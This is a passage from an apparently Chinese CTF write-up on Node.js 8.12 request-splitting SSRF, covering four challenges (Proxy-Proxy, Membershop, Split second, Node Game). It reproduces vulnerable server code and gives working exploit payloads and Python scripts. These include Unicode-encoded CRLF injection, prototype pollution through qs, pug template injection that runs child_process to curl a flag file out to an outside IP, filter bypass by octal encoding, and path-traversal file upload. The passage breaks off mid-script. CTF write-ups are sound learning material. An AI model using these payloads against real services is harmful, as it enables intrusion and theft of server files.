真是Node.js的美妙特性\n对这样一个账号再次进行DELETE请求时则会这样\nconsole.log(Buffer.from(\u0026#39;DELETE /account/f9f9eebb05ef4b819b0467cc5ddd3b4a/email/x@̠ňɔɔɐį1̮1č̊č̊ɇͅɔ̠įaccountįf9f9eebb05ef4b819b0467cc5ddd3b4aįsessions̠ňɔɔɐį1̮1č̊č̊.cc\u0026#39;, \u0026#39;latin1\u0026#39;).toString()) SSRF来了\n[ASISCTF final 2018]Proxy-Proxy 简单审了一下代码，标记到注释中了\nconst express = require(\u0026#39;express\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const body_parser = require(\u0026#39;body-parser\u0026#39;); const md5 = require(\u0026#39;md5\u0026#39;); const http = require(\u0026#39;http\u0026#39;); var ip = require(\u0026#34;ip\u0026#34;); require(\u0026#39;x-date\u0026#39;); var server_ip = ip.address() const server = express(); server.use(body_parser.urlencoded({ extended: true })); server.use(express.static(\u0026#39;public\u0026#39;)) server.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); server.set(\u0026#39;view engine\u0026#39;, \u0026#39;jade\u0026#39;); server.listen(5000) server.get(\u0026#39;/\u0026#39;, function(request, result) { result.render(\u0026#39;index\u0026#39;); result.end() }) function check_endpoint(available_endpoints, endpoint) { for (i of available_endpoints) { if (endpoint.indexOf(i) == 0) { return true; } } return false; } fs.readFile(\u0026#39;flag.dat\u0026#39;, \u0026#39;utf8\u0026#39;, function(err, contents) { if (err) { throw err; } flag = contents; }) server.get(\u0026#39;/proxy/internal_website/:page\u0026#39;, function(request, result) { var available_endpoints = [\u0026#39;public_notes\u0026#39;, \u0026#39;public_links\u0026#39;, \u0026#39;source_code\u0026#39;] var page = request.params.page result.setHeader(\u0026#39;X-Node-js-Version\u0026#39;, \u0026#39;v8.12.0\u0026#39;)\t// 版本提示 result.setHeader(\u0026#39;X-Express-Version\u0026#39;, \u0026#39;v4.16.3\u0026#39;) if (page.toLowerCase().includes(\u0026#39;flag\u0026#39;)) { // 先转小写再判断 不能有flag result.sendStatus(403) result.end() } else if (!check_endpoint(available_endpoints, page)) { // 白名单审查 result.render(\u0026#39;available_endpoints\u0026#39;, { endpoints: JSON.stringify(available_endpoints) }) result.end() } else { http.get(\u0026#39;http://127.0.0.1:5000/\u0026#39; + page, function(res) { res.setEncoding(\u0026#39;utf8\u0026#39;); if (res.statusCode == 200) { res.on(\u0026#39;data\u0026#39;, function(chunk) { result.render(\u0026#39;proxy\u0026#39;, { contents: chunk // 返回结果 }) result.end() }); } else if (res.statusCode == 404) { result.render(\u0026#39;proxy\u0026#39;, { contents: \u0026#39;The resource not found.\u0026#39; }) result.end() } else { result.end() } }).on(\u0026#39;error\u0026#39;, function(e) { console.log(\u0026#34;Got error: \u0026#34; + e.message); // 返回报错原因 }); } }) server.use(function(request, result, next) { // 检查ip是否为本地 ip = request.connection.remoteAddress if (ip.substr(0, 7) == \u0026#34;::ffff:\u0026#34;) { ip = ip.substr(7) } if (ip != \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; ip != server_ip) { result.render(\u0026#39;unauthorized\u0026#39;) result.end() } else { next() } }) server.get(\u0026#39;/public_notes\u0026#39;, function(request, result) { result.render(\u0026#39;public_notes\u0026#39;); result.end() }) server.get(\u0026#39;/public_links\u0026#39;, function(request, result) { result.render(\u0026#39;public_links\u0026#39;); result.end() }) server.get(\u0026#39;/source_code\u0026#39;, function(request, result) { fs.readFile(\u0026#39;server.js\u0026#39;, \u0026#39;utf8\u0026#39;, function(err, contents) { if (err) { throw err; } result.render(\u0026#39;source_code\u0026#39;, { source: contents // 返回源码 }) result.end() }) }) server.get(\u0026#39;/flag/:token\u0026#39;, function(request, result) { var token = request.params.token if (token.length \u0026gt; 10) { console.log(ip) // 长度大于10回显ip fs.writeFile(\u0026#39;public/temp/\u0026#39; + md5(ip + token), flag, (err) =\u0026gt; { // 将flag写入public/temp/md5(ip+token)路径下 路径可控 但是访问本身受限 需要SSRF绕过 if (err) throw err; result.end(); }); } }) server.get(\u0026#39;/\u0026#39;, function(request, result) { result.render(\u0026#39;index\u0026#39;); result.end() }) server.get(\u0026#39;*\u0026#39;, function(req, result) { result.sendStatus(404); result.end() }); 突破口在它使用的Node.js的版本恰好有上述SSRF的问题\nresult.setHeader(\u0026#39;X-Node-js-Version\u0026#39;, \u0026#39;v8.12.0\u0026#39;) result.setHeader(\u0026#39;X-Express-Version\u0026#39;, \u0026#39;v4.16.3\u0026#39;) 入手点的代码代码就是这里了\n现在就说想办法绕过白名单的审查并构造payload；我们需要第一个请求指向/proxy/internal_website/public_notes，第二个请求指向/flag/amiz，让flag存在public/temp/md5(127.0.0.1amiz)路径下\npublic_notes\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}127.0.0.1\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/\\u{0166}\\u{016c}\\u{0161}\\u{0167}/amiz /proxy/internal_website/public_notes%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2F%C5%A6%C5%AC%C5%A1%C5%A7%2Famiz [安洵杯 2019]Membershop admin会被过滤，那就先简单登入\n抓包后通过session可以看出是koa框架\n这里出题人说很容易联想到后端使用toUpperCase()的转换，用拉丁文越权登录admın，之前也有一次做题用到这个点了，但是在这里没有想起来，我的\n这下可以看源码了\nconst Koa = require(\u0026#39;koa\u0026#39;) const router = require(\u0026#39;koa-router\u0026#39;) const session = require(\u0026#39;koa-session\u0026#39;) const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;) const isString = require(\u0026#39;underscore\u0026#39;).isString const views = require(\u0026#39;koa-views\u0026#39;) const path = require(\u0026#39;path\u0026#39;) const static = require(\u0026#39;koa-static\u0026#39;) const http = require(\u0026#39;http\u0026#39;) const fs = require(\u0026#39;fs\u0026#39;) const md5 = require(\u0026#39;md5\u0026#39;); const qs = require(\u0026#39;qs\u0026#39;); const app = new Koa() const home = new router() const CONFIG = { key: \u0026#39;koa:sess\u0026#39;, maxAge: 1800000, overwrite: true, httpOnly: true, signed: true, rolling: false, renew: false, }; function checkUser(username){ while(username.match(/admin/i)) { username = username.replace(/admin/i, \u0026#39;\u0026#39;); } if(isString(username) \u0026amp;\u0026amp; username){ return username; }else{ return undefined; } } function checkUrl(url){ if(url.indexOf(\u0026#34;http://\u0026#34;+server_ip+\u0026#34;:3000/query\u0026#34;) === 0 \u0026amp;\u0026amp; url.indexOf(\u0026#39;save\u0026#39;) === -1){ return url; }else{ return \u0026#39;errorurl\u0026#39;; } } function WriteResults(sandbox,data){ let filePath = sandbox +\u0026#39;/results.txt\u0026#39; return new Promise(resolve =\u0026gt;{ fs.appendFile(filePath,data,\u0026#39;utf8\u0026#39;,function(error){ if(error){ console.log(error); return false; } console.log(\u0026#39;写入成功\u0026#39;); resolve(filePath); }); }); } function DeleteResults(sandbox){ let filePath = sandbox+\u0026#39;/results.txt\u0026#39; fs.unlink(filePath),function(error){ if(error){ console.log(err); return false; } console.log(\u0026#39;删除文件成功\u0026#39;); } } home.get(\u0026#39;/query\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.query.param){ ctx.response.body = String(ctx.query.param).replace(/\u0026amp;/g, \u0026#39;\u0026amp;amp;\u0026#39;).replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;).replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt;\u0026#39;) }else{ ctx.status = 403; ctx.response.body = \u0026#39;missing parameter:param\u0026#39;; } }) home.get(\u0026#39;/request\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.session.username === \u0026#39;ADMIN\u0026#39; \u0026amp;\u0026amp; ctx.query.url){ url = decodeURI(checkUrl(ctx.query.url)) if(url === \u0026#39;errorurl\u0026#39;){ ctx.response.body = \u0026#39;error url\u0026#39;; }else{ console.log(\u0026#34;请求的url:\u0026#34;+typeof(url)+\u0026#34;:\u0026#34;+url); return new Promise( resolve =\u0026gt; { const req = http.request(url, res =\u0026gt; { res.setEncoding(\u0026#39;utf-8\u0026#39;); let data = \u0026#39;\u0026#39;; let error; if (res.statusCode !== 200){ error = new Error(\u0026#39;请求失败\\n\u0026#39; + `状态码: ${res.statusCode}`) }; if (error) { console.error(error.message); res.resume(); return; } res.on(\u0026#39;data\u0026#39;, chunk =\u0026gt; { data += chunk.toString(); }); res.on(\u0026#39;end\u0026#39;, async() =\u0026gt; { let out = await WriteResults(ctx.session.sandbox,data); ctx.body = \u0026#39;Requst results in :\u0026#39;+out.replace(\u0026#39;tmp\u0026#39;,\u0026#39;\u0026#39;); resolve(); }) }) req.on(\u0026#39;error\u0026#39;, function(err){ console.log(err); }); req.end(); }); } }else{ ctx.status = 403; ctx.response.body = \u0026#39;403: You have not the permission\u0026#39; } }) home.get(\u0026#39;/save\u0026#39;,async(ctx)=\u0026gt;{ let ip = ctx.request.ip; if (ip.substr(0, 7) == \u0026#34;::ffff:\u0026#34;) { ip = ip.substr(7); } if (ip !== \u0026#39;127.0.0.1\u0026#39; \u0026amp;\u0026amp; ip !== server_ip) { ctx.status = 403; ctx.response.body = \u0026#39;403: You are not the local user\u0026#39;; }else { let reqbody = {switch:false} reqbody = qs.parse(ctx.querystring,{allowPrototypes: false}); if(reqbody.switch === true \u0026amp;\u0026amp; reqbody.sandbox \u0026amp;\u0026amp; reqbody.opath \u0026amp;\u0026amp;fs.existsSync(reqbody.spath)){ if(fs.existsSync(reqbody.sandbox)){ paths.opath = fs.readdirSync(reqbody.sandbox)[0]; }else if(fs.existsSync(reqbody.opath)){ let buffer; tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;] = reqbody.opath; if(/[flag]/.test(tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;])){ buffer = tmp[reqbody.sandbox][\u0026#39;opath\u0026#39;].replace(/f|l|a|g/g,\u0026#39;\u0026#39;); }else{ buffer = reqbody.opath; } } let opath = paths.opath? paths.opath : buffer; let text = fs.readFileSync(opath, \u0026#39;utf8\u0026#39;); await WriteResults(reqbody.spath,text); }else{ return false; } } }) home.get(\u0026#39;/delete\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.session.username === \u0026#39;ADMIN\u0026#39; \u0026amp;\u0026amp; fs.existsSync(ctx.session.sandbox+\u0026#39;/results.txt\u0026#39;)){ DeleteResults(ctx.session.sandbox); ctx.response.body = \u0026#39;Delete the results Successfully!\u0026#39; }else{ ctx.response.body = \u0026#39;Nothing to delete!\u0026#39;; } }) home.get(\u0026#39;/login\u0026#39;,async(ctx)=\u0026gt;{ if(ctx.query.userName){ let username = checkUser(ctx.query.userName); if (username !== undefined){ ctx.session.username = username.toUpperCase(); } } ctx.redirect(\u0026#39;/\u0026#39;); }) home.get(\u0026#39;/\u0026#39;,async(ctx)=\u0026gt;{ let isAdmin = undefined; if(!ctx.session.username){ await ctx.render(\u0026#39;user\u0026#39;,{ list:undefined, isAdmin:isAdmin }); }else{ info.username = ctx.session.username; info.Privilege = \u0026#34;Staff\u0026#34;; if(ctx.session.username === \u0026#39;ADMIN\u0026#39;){ info.Privilege = \u0026#34;Monitor\u0026#34;; isAdmin = true; if(!ctx.session.sandbox){ ctx.session.sandbox = \u0026#39;tmp/\u0026#39;+md5(ctx.request.ip); } if (!fs.existsSync(ctx.session.sandbox)){ fs.mkdirSync(ctx.session.sandbox); } } await ctx.render(\u0026#39;user\u0026#39;,{ list:info, isAdmin:isAdmin }); } }) app.keys = [\u0026#39;hpdoger\u0026#39;]; var info = new Object(); var tmp = []; var paths = []; //depend on remote server,not real var server_ip = \u0026#39;127.0.0.1\u0026#39; app.use(views(path.join(__dirname, \u0026#39;./views\u0026#39;), { extension: \u0026#39;ejs\u0026#39; })) app.use(static( path.join( __dirname, \u0026#39;./static\u0026#39;) )) app.use(static( path.join( __dirname, \u0026#39;./tmp\u0026#39;) )) app.use(bodyParser()) app.use(session(CONFIG, app)); app.use(home.routes()).use(home.allowedMethods()); app.listen(3000) console.log(\u0026#39;[demo] start-quick is starting at port 3000\u0026#39;) 唔，看起来要比其它的复杂不少，但是核心漏洞点是一样的；简单审一下代码\n只允许admin用户才可以加载其它的模板\n确实是toUpperCase()的问题，很轻松就用admın绕过了\n/request路由下的请求经过CheckUrl的检查\n必须开头是http://127.0.0.1:3000/query，没法绕过，需要SSRF；请求之后会被记录在sandbox的results.txt里面（追加的形式），sandbox根据ip建立\n而恰好/query本身也是一个路由\n并且参数param比较好绕过，我们借助它来完成我们的攻击；接下来找利用点，看到/save路由\n简单的分析写在注释中了，138行用ssrf绕过，146行使用的qs库有原型链污染的问题，传参]=switch即可绕过；154行的判断也需要绕过，原型链污染sandbox下的一个文件为/flag，再去自定义读到spath中\ntmp[\u0026#39;__proto__\u0026#39;][\u0026#39;opath\u0026#39;] = \u0026#39;/flag\u0026#39;; =\u0026gt; paths.opath = /flag payload\namiz HTTP/1.1 Host: 127.0.0.1:3000 Connection: keep-alive GET /save?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76 http://127.0.0.1:3000/query?param=1\\u{0120}HTTP/1.1\\u{010D}\\u{010A}Host:\\u{0120}127.0.0.1:3000\\u{010D}\\u{010A}Connection:\\u{0120}keep-alive\\u{010D}\\u{010A}\\u{010D}\\u{010A}GET\\u{0120}/\\u{0173}\\u{0161}\\u{0176}\\u{0165}?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=tmp/c74e4def8b621891bc34c84bca9b2a76 当然，用完全unicode编码也是可以的，亲测这个全编码容错率会高一丢丢\nfrom requests.utils import quote _payload = \u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 Host: 127.0.0.1:3000 Connection: keep-alive GET /save?]=switch\u0026amp;sandbox=__proto__\u0026amp;opath=/flag\u0026amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76\u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) payload = \u0026#39;\u0026#39;.join(chr(int(\u0026#39;0xff\u0026#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(quote(payload)) [nullcon HackIM2020]Split second //node 8.12.0 var express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var http = require(\u0026#39;http\u0026#39;); var pug = require(\u0026#39;pug\u0026#39;); app.get(\u0026#39;/\u0026#39;, function(req, res) { res.sendFile(path.join(__dirname + \u0026#39;/index.html\u0026#39;)); }); app.get(\u0026#39;/source\u0026#39;, function(req, res) { res.sendFile(path.join(__dirname + \u0026#39;/source.html\u0026#39;)); }); app.get(\u0026#39;/getMeme\u0026#39;,function(req,res){ res.send(\u0026#39;\u0026lt;iframe src=\u0026#34;https://giphy.com/embed/LLHkw7UnvY3Kw\u0026#34; width=\u0026#34;480\u0026#34; height=\u0026#34;480\u0026#34; frameBorder=\u0026#34;0\u0026#34; class=\u0026#34;giphy-embed\u0026#34; allowFullScreen\u0026gt;\u0026lt;/iframe\u0026gt;\u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw\u0026#34;\u0026gt;via GIPHY\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;) }); app.get(\u0026#39;/flag\u0026#39;, function(req, res) { var ip = req.connection.remoteAddress; if (ip.includes(\u0026#39;127.0.0.1\u0026#39;)) { var authheader = req.headers[\u0026#39;adminauth\u0026#39;]; var pug2 = decodeURI(req.headers[\u0026#39;pug\u0026#39;]); var x=pug2.match(/[a-z]/g); if(!x){ if (authheader === \u0026#34;secretpassword\u0026#34;) { var html = pug.render(pug2); } } else{ res.send(\u0026#34;No characters\u0026#34;); } } else{ res.send(\u0026#34;You need to come from localhost\u0026#34;); } }); app.get(\u0026#39;/core\u0026#39;, function(req, res) { var q = req.query.q; var resp = \u0026#34;\u0026#34;; if (q) { var url = \u0026#39;http://localhost:8081/getMeme?\u0026#39; + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\u0026#34;\u0026lt;p\u0026gt;Errrrr, You have been Blocked\u0026lt;/p\u0026gt;\u0026#34;); } else { try { http.get(url, function(resp) { resp.setEncoding(\u0026#39;utf8\u0026#39;); resp.on(\u0026#39;error\u0026#39;, function(err) { if (err.code === \u0026#34;ECONNRESET\u0026#34;) { console.log(\u0026#34;Timeout occurs\u0026#34;); return; } }); resp.on(\u0026#39;data\u0026#39;, function(chunk) { resps = chunk.toString(); res.send(resps); }).on(\u0026#39;error\u0026#39;, (e) =\u0026gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\u0026#34;search param \u0026#39;q\u0026#39; missing!\u0026#34;); } }) function blacklist(url) { var evilwords = [\u0026#34;global\u0026#34;, \u0026#34;process\u0026#34;,\u0026#34;mainModule\u0026#34;,\u0026#34;require\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;child_process\u0026#34;,\u0026#34;exec\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;!\u0026#34;]; var arrayLen = evilwords.length; for (var i = 0; i \u0026lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\u0026#34;Example app listening at http://%s:%s\u0026#34;, host, port) }) 如果上一个题仔细分析的话就会发现这个题只是代码做了一些微小的改动\n需要多构造一个请求头，换行的CRLF和空格SP我们用unicode，而pug执行命令的部分我们可以用八进制字符\n[][\u0026#34;constructor\u0026#34;]\t// valid [][\u0026#34;constructor\u0026#34;][\u0026#34;constructor\u0026#34;](\u0026#34;evalcode\u0026#34;)() [][\u0026#34;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\u0026#34;]\t// valid,executable [][\\42\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\\42]\t// invalid,since \u0026#34; is encoded pug模板两种形式\n#{shellcode} - shellcode 写一个外带flag的payload\n-[][\u0026#34;constructor\u0026#34;][\u0026#34;constructor\u0026#34;](\u0026#34;console.log(this.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl 172.19.0.1:8888 -X POST -d @flag.txt\u0026#39;))\u0026#34;)() 我根据这位大佬的py2版exp.py写了一个py3版本的，并且改的简洁了一些（有了一些通用性，但是由于还是部分unicode编码，总体上不如全编码的稳\nimport requests from requests.utils import quote url = \u0026#39;\u0026#39; charset = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; SPACE = u\u0026#39;\\u0120\u0026#39; CRLF = u\u0026#39;\\u010d\\u010a\u0026#39; SLASH = u\u0026#39;\\u012f\u0026#39; # 仅对字母进行编码 def str2Oct(str): r = \u0026#39;\u0026#39; for i in str: if i in charset: r += \u0026#39;\\\\\u0026#39; + oct(ord(i))[1:] else: r += i return r.replace(\u0026#39;o\u0026#39;, \u0026#39;\u0026#39;) _pug = \u0026#39;\u0026#39;\u0026#39;-[][\u0026#34;constructor][\u0026#34;constructor](\u0026#34;console.log(this.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl http://ip:port/ -d @/flag.txt\u0026#39;))\u0026#34;)()\u0026#39;\u0026#39;\u0026#39; pug = str2Oct(_pug).replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;%22\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#34;%27\u0026#34;) # print(pug) # print(quote(pug)) payload = f\u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 GET /flag HTTP/1.1 x-forwarded-for: 127.0.0.1 adminauth: secretpassword pug: {pug} test: \u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39; \u0026#39;, f\u0026#39;{SPACE}\u0026#39;).replace(\u0026#39;/\u0026#39;, f\u0026#39;{SLASH}\u0026#39;).replace(\u0026#39;\\n\u0026#39;, f\u0026#39;{CRLF}\u0026#39;) print(payload) r = requests.session() result = r.get(\u0026#39;url\u0026#39; + quote(payload)) print(result.content) 本地复现成功\n[GYCTF2020]Node Game var express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var http = require(\u0026#39;http\u0026#39;); var pug = require(\u0026#39;pug\u0026#39;); var morgan = require(\u0026#39;morgan\u0026#39;); const multer = require(\u0026#39;multer\u0026#39;); app.use(multer({dest: \u0026#39;./dist\u0026#39;}).array(\u0026#39;file\u0026#39;)); app.use(morgan(\u0026#39;short\u0026#39;)); // 简化版日志 app.use(\u0026#34;/uploads\u0026#34;,express.static(path.join(__dirname, \u0026#39;/uploads\u0026#39;))) app.use(\u0026#34;/template\u0026#34;,express.static(path.join(__dirname, \u0026#39;/template\u0026#39;))) app.get(\u0026#39;/\u0026#39;, function(req, res) { var action = req.query.action?req.query.action:\u0026#34;index\u0026#34;; // action参数 if( action.includes(\u0026#34;/\u0026#34;) || action.includes(\u0026#34;\\\\\u0026#34;) ){ // 不能有/ \\ res.send(\u0026#34;Errrrr, You have been Blocked\u0026#34;); } file = path.join(__dirname + \u0026#39;/template/\u0026#39;+ action +\u0026#39;.pug\u0026#39;); var html = pug.renderFile(file); // 模板渲染 res.send(html); }); app.post(\u0026#39;/file_upload\u0026#39;, function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: \u0026#39;\u0026#39;, } if (!ip.includes(\u0026#39;127.0.0.1\u0026#39;)) { // 需要SSRF obj.msg=\u0026#34;only admin\u0026#39;s ip can use it\u0026#34; res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = \u0026#39;upload failed\u0026#39;; res.send(JSON.stringify(obj)); }else{ var file_path = \u0026#39;/uploads/\u0026#39; + req.files[0].mimetype +\u0026#34;/\u0026#34;; // 路径确定 mimetype可控 路径穿越 var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \u0026#34;file type error\u0026#34;; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: \u0026#39;upload success\u0026#39;, filename: file_path + file_name } } catch (error) { obj.msg = \u0026#39;upload failed\u0026#39;; } res.send(JSON.stringify(obj)); } }) }) app.get(\u0026#39;/source\u0026#39;, function(req, res) { // 源码 res.sendFile(path.join(__dirname + \u0026#39;/template/source.txt\u0026#39;)); }); app.get(\u0026#39;/core\u0026#39;, function(req, res) { var q = req.query.q; // q参数 var resp = \u0026#34;\u0026#34;; if (q) { var url = \u0026#39;http://localhost:8081/source?\u0026#39; + q // 可控端点 console.log(url) var trigger = blacklist(url); // 黑名单过滤 if (trigger === true) { res.send(\u0026#34;\u0026lt;p\u0026gt;error occurs!\u0026lt;/p\u0026gt;\u0026#34;); } else { try { http.get(url, function(resp) { resp.setEncoding(\u0026#39;utf8\u0026#39;); resp.on(\u0026#39;error\u0026#39;, function(err) { if (err.code === \u0026#34;ECONNRESET\u0026#34;) { console.log(\u0026#34;Timeout occurs\u0026#34;); return; } }); resp.on(\u0026#39;data\u0026#39;, function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on(\u0026#39;error\u0026#39;, (e) =\u0026gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\u0026#34;search param \u0026#39;q\u0026#39; missing!\u0026#34;); } }) function blacklist(url) {\t// urlencode绕过 字符串拼接绕过 unicode绕过 var evilwords = [\u0026#34;global\u0026#34;, \u0026#34;process\u0026#34;,\u0026#34;mainModule\u0026#34;,\u0026#34;require\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;child_process\u0026#34;,\u0026#34;exec\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;!\u0026#34;]; var arrayLen = evilwords.length; for (var i = 0; i \u0026lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\u0026#34;Example app listening at http://%s:%s\u0026#34;, host, port) }) 有上面两个题的铺垫，这个代码就会好理解一些\n这个题改编的地方在于多了一个任意文件上传，可以通过../的mimetype来进行目录穿越，pug渲染会借助我们上传的.pug模板，在这里包含flag.txt\n通过抓包修改内容来做payload\nHTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: /../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- GET /flag HTTP/1.1 Host: amiz Connection: close amiz: 使用上面我们已经构造好的通用exp.py构造payload\nimport requests from requests.utils import quote url = \u0026#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=\u0026#39; SPACE = u\u0026#39;\\u0120\u0026#39; CRLF = u\u0026#39;\\u010d\\u010a\u0026#39; SLASH = u\u0026#39;\\u012f\u0026#39; DOUBLE_MARK = u\u0026#39;\\u0122\u0026#39; SINGLE_MARK = u\u0026#39;\\u0127\u0026#39; _payload = \u0026#39;\u0026#39;\u0026#39;HTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: /../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- GET /flag HTTP/1.1 Host: amiz Connection: close amiz: \u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#39; \u0026#39;, f\u0026#39;{SPACE}\u0026#39;).replace(\u0026#39;\\n\u0026#39;, f\u0026#39;{CRLF}\u0026#39;).replace(\u0026#39;/\u0026#39;, f\u0026#39;{SLASH}\u0026#39;).replace(\u0026#39;\u0026#34;\u0026#39;, f\u0026#39;{DOUBLE_MARK}\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;, f\u0026#39;{SINGLE_MARK}\u0026#39;) print(payload) result = requests.get(url + quote(payload)) print(result.text) 成功得到flag，本地抓包看一下具体情况\n在exp中我们对一些特殊字符做了unicode编码，被编码的字符应该包括以下这些\n! \u0026amp; ` ; + \\ / \u0026#34; \u0026#39; \u0026lt;SPACE\u0026gt; \u0026lt;CRLF\u0026gt; （！！！注意 这里很可能有遗漏或者不必要的 请根据实际情况修改\n下面是完全编码的exp.py\nimport urllib.parse import requests _payload = \u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: ../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- \u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) payload = \u0026#39;\u0026#39;.join(chr(int(\u0026#39;0xff\u0026#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(payload) r = requests.get(\u0026#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=\u0026#39; + urllib.parse.quote(payload)) print(r.text) 将会构造出这种玩意\n另外pug模板除了包含flag.txt以外还可以跟上面nullcon的题一样用curl请求来外带flag；稍微修改一下exp即可\n放一下官方exp.py\nimport requests import sys payloadRaw = \u0026#34;\u0026#34;\u0026#34;x HTTP/1.1 POST /file_upload HTTP/1.1 Host: localhost:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942 Content-Length: 6279 Origin: http://localhost:8081 Connection: close Referer: http://localhost:8081/?action=upload Upgrade-Insecure-Requests: 1 -----------------------------12837266501973088788260782942 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;5am3_get_flag.pug\u0026#34; Content-Type: ../template - global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;evalcmd\u0026#39;) -----------------------------12837266501973088788260782942-- \u0026#34;\u0026#34;\u0026#34; def getParm(payload): payload = payload.replace(\u0026#34; \u0026#34;,\u0026#34;%C4%A0\u0026#34;) payload = 